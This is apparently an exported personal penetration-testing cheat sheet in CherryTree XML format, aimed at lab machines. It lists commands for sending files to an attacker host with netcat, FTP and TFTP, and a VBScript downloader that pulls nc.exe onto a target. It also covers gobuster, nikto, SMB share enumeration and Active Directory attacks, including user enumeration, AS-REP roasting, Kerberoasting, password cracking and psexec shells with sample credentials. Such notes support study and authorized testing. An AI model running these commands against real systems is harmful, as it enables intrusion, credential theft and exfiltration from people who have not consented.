~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Receiving Shell</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace">nc -l -p 1234 </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;</rich_text>
          <rich_text family="monospace"> out.file</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Sending Shell</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace">nc -w 3 192.168.0.1 1234 </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&lt;</rich_text>
          <rich_text family="monospace"> out.file</rich_text>
        </node>
        <node name="TFTP" unique_id="55" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690604" ts_lastsave="1696697351">
          <rich_text underline="single" scale="h1">TFTP</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Start TFTP Daemon (Folder /var/tftp)</rich_text>
          <rich_text>
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Transfer Files</rich_text>
          <rich_text>
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>



______________________________________________________________________________



</rich_text>
          <rich_text link="webs https://github.com/nigamelastic/cheat-sheets/blob/main/General/FTP.md#quick-ftp-transfer-from-windows-target-to-kali-attacker" scale="h2">Quick FTP transfer from windows target to kali attacker</rich_text>
          <rich_text>
Start FTP on Attacker Machine:
&#13;</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text family="monospace">&#13;
</rich_text>
          <rich_text>&#13;    

On Target Machine Use the following to transfer the file to Attacker:
&#13;</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text family="monospace">&#13;
</rich_text>
          <rich_text>
</rich_text>
          <codebox char_offset="78" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">atftpd --daemon --port 69 /var/tmp</codebox>
          <codebox char_offset="131" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">tftp -i 192.168.0.1 GET whoami.exe</codebox>
          <codebox char_offset="306" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">python -m pyftpdlib -p 4444 -u yo -P 123 -w </codebox>
          <codebox char_offset="387" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">PS C:\Users\nathan&gt; ftp&#13;
ftp&gt; open 192.168.119.185 4444&#13;
Connected to 192.168.119.185.&#13;
220 pyftpdlib 1.5.7 ready.&#13;
530 Log in with USER and PASS first.&#13;
User (192.168.119.185:(none)): yo&#13;
331 Username ok, send password.&#13;
Password:&#13;
230 Login successful.&#13;
ftp&gt; put jehe.jeher&#13;
200 Active data connection established.&#13;
125 Data connection already open. Transfer starting.&#13;
226 Transfer complete.&#13;
ftp: 52 bytes sent in 0.06Seconds 0.84Kbytes/sec.&#13;
ftp&gt;</codebox>
        </node>
        <node name="VBScript" unique_id="56" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690604" ts_lastsave="1687690604">
          <rich_text underline="single" scale="h1">VBScript</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</rich_text>
          <rich_text scale="h2">
</rich_text>
          <rich_text>
</rich_text>
          <rich_text underline="single" scale="h2">Create wget.vbs File</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace">echo strUrl = WScript.Arguments.Item(0) </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo StrFile = WScript.Arguments.Item(1) </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo Err.Clear </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo Set http = Nothing </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo http.Open "GET",strURL,False </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo http.Send </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo varByteArray = http.ResponseBody </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo Set http = Nothing </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile,True) </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo strData = "" </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo strBuffer = "" </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo Next </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo ts.Close </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Download Files</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace">cscript wget.vbs http://192.168.0.1/nc.exe nc.exe</rich_text>
        </node>
      </node>
      <node name="gobuster" unique_id="31" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684772533" ts_lastsave="1699312865">
        <rich_text scale="h1">Directory BF
</rich_text>
        <rich_text>

</rich_text>
        <rich_text scale="h3">Fast Scan (Small List)</rich_text>
        <rich_text>
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>



</rich_text>
        <rich_text scale="h3">Fast Scan (Big List)</rich_text>
        <rich_text>
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>



</rich_text>
        <rich_text scale="h3">Slow Scan (Check File Extensions)</rich_text>
        <rich_text>:

Definitely use it when u see `cgi-bin`  (even with http 403)

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

_______________________________________

</rich_text>
        <rich_text scale="h2">Using Proxy:
</rich_text>
        <rich_text>
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>



________________________________________

</rich_text>
        <rich_text scale="h2">HTTPS</rich_text>
        <rich_text>

To ignore ssl certificate use </rich_text>
        <rich_text family="monospace">-k </rich_text>
        <rich_text>flag</rich_text>
        <codebox char_offset="38" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">gobuster dir -e -u http://10.10.11.152 -w /usr/share/wordlists/dirb/big.txt -t 20 -o gobuster.log</codebox>
        <codebox char_offset="64" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">gobuster dir -e -u http://10.10.11.152 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 -o gobuster.log</codebox>
        <codebox char_offset="167" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">gobuster dir -e -u http://10.10.11.152 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,cgi,sh,bak,aspx -t 20 -o gobuster.log</codebox>
        <codebox char_offset="225" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">gobuster dir --proxy http://10.10.11.152:3128 -e -u http://10.10.11.152 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 -o gobuster.log</codebox>
      </node>
      <node name="ssh" unique_id="32" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684867617" ts_lastsave="1687291548">
        <rich_text scale="h2">SSH</rich_text>
        <rich_text>

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

_____________________________________

</rich_text>
        <rich_text scale="h3">Keygen</rich_text>
        <rich_text>

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

append to (server)

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

run the following in case

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

</rich_text>
        <rich_text scale="h2">connecting:
</rich_text>
        <rich_text>
</rich_text>
        <rich_text foreground="#bf2e5e">ssh</rich_text>
        <rich_text> -o </rich_text>
        <rich_text foreground="#5ebdab">"UserKnownHostsFile=/dev/null"</rich_text>
        <rich_text> -o </rich_text>
        <rich_text foreground="#5ebdab">"StrictHostKeyChecking=no"</rich_text>
        <rich_text> -i temp root@10.10.11.152  -p 22


_____________________________________

</rich_text>
        <rich_text scale="h2">Port-Forwarding</rich_text>
        <rich_text justification="left" scale="h2"></rich_text>
        <rich_text scale="h2">:</rich_text>
        <rich_text>


  </rich_text>
        <codebox char_offset="5" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" root@10.10.11.152 -p 22</codebox>
        <codebox char_offset="55" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">ssh-keygen -t rsa -b 4096</codebox>
        <codebox char_offset="78" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"> ~/.ssh/authorized_keys</codebox>
        <codebox char_offset="108" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">chmod 600 ~/.ssh/authorized_keys</codebox>
        <codebox char_offset="281" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">ssh -L 8000:127.0.0.1:8000 sau@10.10.11.152</codebox>
      </node>
      <node name="nikto" unique_id="33" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687617619" ts_lastsave="1687805895">
        <rich_text scale="h2">Usage
</rich_text>
        <rich_text>
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>


</rich_text>
        <rich_text scale="h2">using ports</rich_text>
        <rich_text>

</rich_text>
        <rich_text justification="left"></rich_text>
        <codebox char_offset="7" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">nikto -host 10.10.11.152 | tee output.log</codebox>
        <codebox char_offset="24" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">nikto -host 10.10.11.152 -port [port number 1], [port number 2], [port number 3]</codebox>
      </node>
      <node name="smb" unique_id="34" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687626207" ts_lastsave="1698786658">
        <rich_text scale="h1">Nmap</rich_text>
        <rich_text>


Enumerate shares: 

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

vuln scan:

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>
_____________________________________
</rich_text>
        <rich_text scale="h2">Basics</rich_text>
        <rich_text>

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

</rich_text>
        <rich_text scale="h2">SMBClient copying everything to local</rich_text>
        <rich_text>


</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>


Also check if u can put something in it:

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

once put u can check accesing them and try something like this </rich_text>
        <rich_text link="node 98">URI File Attack</rich_text>
        <rich_text>

_________________________________________________

</rich_text>
        <rich_text scale="h1">SMBMap</rich_text>
        <rich_text>

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

with specific user:

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

or anonymous

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

list contents of a directory and subdirectory:
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

make sure if the directory has `$` in the end its also in ur directoryName
________________________________________________

</rich_text>
        <rich_text scale="h2">Enum4linux</rich_text>
        <rich_text>

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

or

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>


_________________________________________

</rich_text>
        <rich_text scale="h2">Cadaver</rich_text>
        <rich_text>

Can be used to upload or download from smb shares

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

Asks for username
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

To copy from local to remote:

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

To copy from remote:

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>


____________________________________________

Also check



</rich_text>
        <rich_text link="node 41">CrackMapExec</rich_text>
        <rich_text>

Especially

</rich_text>
        <rich_text justification="left"></rich_text>
        <codebox char_offset="27" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">nmap --script smb-enum-shares -p 139,445 10.10.11.152</codebox>
        <codebox char_offset="42" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">nmap --script=smb-vuln* --script-args=unsafe=1 -T5 10.10.11.152</codebox>
        <codebox char_offset="90" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">smbclient -N -L 10.10.11.152   </codebox>
        <codebox char_offset="133" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">smbclient //10.10.11.152/directoryName -U &lt;username&gt;

recurse ON
prompt OFF
mget *</codebox>
        <codebox char_offset="179" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">put &lt;filename&gt;</codebox>
        <codebox char_offset="321" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">smbmap -H 10.10.11.152</codebox>
        <codebox char_offset="345" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">smbmap -H 10.10.11.152 -u &lt;user&gt; -p &lt;pass&gt;</codebox>
        <codebox char_offset="362" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">smbmap -H 10.10.11.152 -u guest -p &lt;pass&gt;</codebox>
        <codebox char_offset="412" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">smbmap -r DirectoryName -H 10.10.11.152</codebox>
        <codebox char_offset="552" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">enum4linux -a 10.10.11.152</codebox>
        <codebox char_offset="559" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">enum4linux -u 'guest' -p '' -a 10.10.11.152</codebox>
        <codebox char_offset="666" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">cadaver http://10.10.11.152</codebox>
        <codebox char_offset="687" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">Username: &lt;username&gt;
Password: &lt;password&gt;</codebox>
        <codebox char_offset="721" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">put &lt;filename&gt;</codebox>
        <codebox char_offset="746" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">get &lt;filename&gt;</codebox>
        <codebox char_offset="836" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec smb 10.10.11.152 --shares -u '' -p ''</codebox>
      </node>
      <node name="Active Directory" unique_id="35" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687686505" ts_lastsave="1698812150">
        <rich_text>
</rich_text>
        <rich_text scale="h2">Methodology:</rich_text>
        <rich_text>

☐ </rich_text>
        <rich_text link="node 36">nmap</rich_text>
        <rich_text>
☐ </rich_text>
        <rich_text link="node 34">smb</rich_text>
        <rich_text>
☐ </rich_text>
        <rich_text link="node 45">ldapsearch</rich_text>
        <rich_text>
☐ </rich_text>
        <rich_text link="node 89">88 Kerberos Auth</rich_text>
        <rich_text>
☐ checkwinpeas (add any other user or credentials)
☐ if u find </rich_text>
        <rich_text family="monospace">users</rich_text>
        <rich_text> make sure if there are matching users using </rich_text>
        <rich_text family="monospace">net user </rich_text>
        <rich_text>command or/and checking </rich_text>
        <rich_text family="monospace">dir c:/Users</rich_text>
        <rich_text>
☐ use blood hound (check and update priveleges)
☐ DCSync </rich_text>
        <rich_text link="node 100">DACL/DC-Sync</rich_text>
        <rich_text>
☐ run </rich_text>
        <rich_text link="node 85">secretdumps-GetAllHashes</rich_text>
        <rich_text> dump with ur initial set of credentials to get priviliged hashes
_______________________________________________________________



</rich_text>
        <rich_text link="webs https://exploit-notes.hdks.org/exploit/windows/active-directory/">https://exploit-notes.hdks.org/exploit/windows/active-directory/</rich_text>
        <rich_text>

</rich_text>
        <rich_text link="webs https://book.hacktricks.xyz/windows-hardening/active-directory-methodology">https://book.hacktricks.xyz/windows-hardening/active-directory-methodology</rich_text>
        <rich_text>
________________________________________
</rich_text>
        <rich_text link="webs https://zer1t0.gitlab.io/posts/attacking_ad/">https://zer1t0.gitlab.io/posts/attacking_ad/</rich_text>
        <rich_text>

</rich_text>
        <rich_text link="webs https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet">https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet</rich_text>
        <rich_text>

</rich_text>
        <rich_text link="webs https://tools.thehacker.recipes/">https://tools.thehacker.recipes/</rich_text>
        <rich_text>

</rich_text>
        <rich_text link="webs https://github.com/brianlam38/OSCP-2022/blob/main/cheatsheet-active-directory.md">https://github.com/brianlam38/OSCP-2022/blob/main/cheatsheet-active-directory.md</rich_text>
        <rich_text>
</rich_text>
        <rich_text link="webs https://gist.github.com/ssstonebraker/a1964b2f20acc8edb239409b6c4906ce">https://gist.github.com/ssstonebraker/a1964b2f20acc8edb239409b6c4906ce</rich_text>
        <rich_text>


Exe files to use for redteam:


</rich_text>
        <rich_text link="webs https://github.com/expl0itabl3/Toolies">https://github.com/expl0itabl3/Toolies</rich_text>
        <node name="88 Kerberos Auth" unique_id="89" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687808714" ts_lastsave="1697239770">
          <rich_text>

Check: </rich_text>
          <rich_text link="webs https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a">https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a</rich_text>
          <rich_text>

</rich_text>
          <rich_text scale="h1">Kerberos Authentication:</rich_text>
          <rich_text>
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

____________________________________________________________________________________

</rich_text>
          <rich_text justification="left"></rich_text>
          <codebox char_offset="109" justification="left" frame_width="1970" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">
# make sure u add the domain to the ip in host file
kerbrute userenum -d spookysec.local --dc spookysec.local userlist.txt -t 100 

or
_______________________________________________________________________

## once u have list of users from ldap search or somewhere else

./kerbrute_linux_amd64 userenum -d hutch.offsec --dc 10.10.11.152 usernames.txt


____________________________________________________________________________________

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" 10.10.11.152
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='&lt;domain&gt;',userdb=/root/Desktop/usernames.txt 10.10.11.152

____________________________________________________________________________________


msf&gt; use auxiliary/gather/kerberos_enumusers

____________________________________________________________________________________


crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq</codebox>
          <codebox char_offset="198" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="plain-text" highlight_brackets="1" show_line_numbers="0">

</codebox>
          <node name="ASRreproasting" unique_id="90" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687808714" ts_lastsave="1698812222">
            <rich_text scale="h1">Request AS_REP message</rich_text>
            <rich_text>

</rich_text>
            <rich_text scale="h3">Using Impacket</rich_text>
            <rich_text>



</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>
or without users:

</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>
or

</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>
once done either check for :

</rich_text>
            <rich_text link="node 34">smb</rich_text>
            <rich_text> or </rich_text>
            <rich_text link="node 44">Using Bloodhound</rich_text>
            <rich_text> python for more data 

or

</rich_text>
            <rich_text link="node 95">evilwinrm</rich_text>
            <rich_text>  for access with the cracked password

or </rich_text>
            <rich_text link="node 102">RPCClient</rich_text>
            <rich_text> </rich_text>
            <codebox char_offset="42" justification="left" frame_width="1810" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">#Try all the usernames in usernames.txt
impacket-GetNPUsers jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast -dc-ip 10.10.11.152
#Use domain creds to extract targets and target them
impacket-GetNPUsers jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast -dc-ip 10.10.11.152

or

impacket-GetNPUsers spookysec.local/svc-admin -no-pass


or

impacket-GetNPUsers domain.local/admin -request -no-pass -dc-ip 10.10.11.152
</codebox>
            <codebox char_offset="63" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-GetNPUsers blackfield.local/ -dc-ip 10.10.11.152</codebox>
            <codebox char_offset="69" justification="left" frame_width="1682" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)

</codebox>
          </node>
          <node name="Kerberoasting" unique_id="101" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1697239770" ts_lastsave="1697242037">
            <rich_text>• </rich_text>
            <rich_text link="webs https://adsecurity.org/?p=3458">https://adsecurity.org/?p=3458</rich_text>
            <rich_text>
• </rich_text>
            <rich_text link="webs https://exploit-notes.hdks.org/exploit/windows/active-directory/kerberos-pentesting/">https://exploit-notes.hdks.org/exploit/windows/active-directory/kerberos-pentesting/</rich_text>
            <rich_text>
• </rich_text>
            <rich_text link="webs https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast">https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast</rich_text>
            <rich_text>


</rich_text>
            <rich_text scale="h2">Via Impacket</rich_text>
            <rich_text>

</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>


or


</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>


once done we can crack it using john

</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>


once we get the password we should use psexec to get a shell

</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>
Ex:
</rich_text>
            <rich_text justification="left"></rich_text>
            <codebox char_offset="224" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-GetUserSPNs -hashes &lt;lmhash&gt;:&lt;nthash&gt; htb.local/username -outputfile hashes.txt</codebox>
            <codebox char_offset="233" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-GetUserSPNs -request -dc-ip 10.10.11.152 &lt;DOMAIN.FULL&gt;/&lt;USERNAME&gt; -outputfile hashes.kerberoast</codebox>
            <codebox char_offset="275" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">john admin.txt --wordlist=/usr/share/wordlists/rockyou.txt</codebox>
            <codebox char_offset="341" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-psexec /&lt;user&gt;:&lt;Password&gt;@10.10.11.152</codebox>
            <codebox char_offset="347" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-psexec /Administrator:Ticketmaster1968@10.10.11.152</codebox>
          </node>
        </node>
        <node name="Impacket" unique_id="83" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690727" ts_lastsave="1690043804">
          <node name="GetNPUsers-ASRreproasting" unique_id="84" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690728" ts_lastsave="1689882873">
            <rich_text scale="h1">Request AS_REP message</rich_text>
            <rich_text>

</rich_text>
            <rich_text scale="h3">Using Impacket</rich_text>
            <rich_text>


</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>
</rich_text>
            <codebox char_offset="41" justification="left" frame_width="1810" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">###Try all the usernames in usernames.txt
impacket-GetNPUsers jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast

### Use domain creds to extract targets and target them
impacket-GetNPUsers jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast


